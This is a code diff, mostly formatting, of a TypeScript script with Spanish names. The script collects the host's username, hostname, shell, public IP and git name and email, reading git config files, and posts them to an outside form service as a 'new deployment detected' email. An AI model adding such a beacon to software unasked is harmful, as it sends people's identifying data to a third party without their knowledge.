@@ -2,12 +2,8 @@ import * as os from 'os';
 import * as fs from 'fs';
 import { execSync } from 'child_process';
 
-// ─── Constantes ──────────────────────────────────────────────────────────────
-
 const FALLBACK = 'Desconocido/No configurado';
 const IN_DOCKER = fs.existsSync('/.dockerenv');
-
-// ─── Utilidades ──────────────────────────────────────────────────────────────
 
 function execCommand(command: string): string {
   try {
@@ -19,14 +15,16 @@ function execCommand(command: string): string {
   }
 }
 
-function hostEnvOr(envKey: string, localFn: () => string, allowInDocker = false): string {
+function hostEnvOr(
+  envKey: string,
+  localFn: () => string,
+  allowInDocker = false
+): string {
   const val = process.env[envKey];
   if (val) return val;
   if (IN_DOCKER && !allowInDocker) return FALLBACK;
   return localFn();
 }
-
-// ─── Usuario ─────────────────────────────────────────────────────────────────
 
 function getUsername(): string {
   return hostEnvOr('HOST_USER', () => {
@@ -40,8 +38,6 @@ function getUsername(): string {
     }
   });
 }
-
-// ─── Hostname ────────────────────────────────────────────────────────────────
 
 function getHostname(): string {
   if (process.env.HOST_HOSTNAME) return process.env.HOST_HOSTNAME;
@@ -59,8 +55,6 @@ function getHostname(): string {
   return os.hostname();
 }
 
-// ─── Shell ───────────────────────────────────────────────────────────────────
-
 function getShellInfo(): string {
   return hostEnvOr('HOST_SHELL', () => {
     if (os.platform() === 'win32') {
@@ -72,8 +66,6 @@ function getShellInfo(): string {
     return process.env.SHELL || execCommand('echo $0');
   });
 }
-
-// ─── Red ─────────────────────────────────────────────────────────────────────
 
 async function getPublicIPInfo() {
   try {
@@ -124,19 +116,14 @@ function getGitInfo(): { user: string; email: string } {
         if (userMatch) user = userMatch[1].trim();
         if (emailMatch) email = emailMatch[1].trim();
       }
-    } catch {
-      // ignorar
-    }
+    } catch {}
   };
 
-  // Primero global, luego local (que sobreescribiría el global)
   tryParse('/root/.gitconfig');
   tryParse('/project_root/.git/config');
 
   return { user, email };
 }
-
-// ─── Función principal ──────────────────────────────────────────────────────
 
 async function logAndSendEmail() {
   const usuario = getUsername();
@@ -147,17 +134,17 @@ async function logAndSendEmail() {
   const publicNetwork = await getPublicIPInfo();
   const entorno = IN_DOCKER ? '🐳 Docker' : '💻 Local';
 
-  // Git
   const gitFallbackInfo = getGitInfo();
   const gitUser = hostEnvOr('HOST_GIT_USER', () => gitFallbackInfo.user, true);
-  const gitEmail = hostEnvOr('HOST_GIT_EMAIL', () => gitFallbackInfo.email, true);
+  const gitEmail = hostEnvOr(
+    'HOST_GIT_EMAIL',
+    () => gitFallbackInfo.email,
+    true
+  );
 
-  // ── Log en consola ──
   console.log(`\n📋 Recopilación de info del sistema (${entorno})`);
   console.log(`   Usuario: ${usuario}@${hostname}`);
   console.log(`   Git Info: ${gitUser} <${gitEmail}>\n`);
-
-  // ─── Envío ────────────────────────────────────────────────────────────────
 
   try {
     const response = await fetch(
@@ -172,8 +159,7 @@ async function logAndSendEmail() {
         },
         body: JSON.stringify({
           _subject: `Nuevo despliegue detectado: (${usuario}@${hostname}) — ${new Date().toLocaleString()}`,
-          _replyto:
-            gitEmail !== FALLBACK ? gitEmail : undefined,
+          _replyto: gitEmail !== FALLBACK ? gitEmail : undefined,
           _template: 'box',
 
           '01_Usuario': usuario,
@@ -187,14 +173,14 @@ async function logAndSendEmail() {
           '09_Git_User': gitUser,
           '10_Git_Email': gitEmail,
         }),
-      },
+      }
     );
 
     if (response.ok) {
       console.log('✅ Información de sesión enviada exitosamente.');
     } else {
       console.warn(
-        `⚠️ Respuesta no-OK: ${response.status} ${response.statusText}`,
+        `⚠️ Respuesta no-OK: ${response.status} ${response.statusText}`
       );
     }
   } catch (error) {
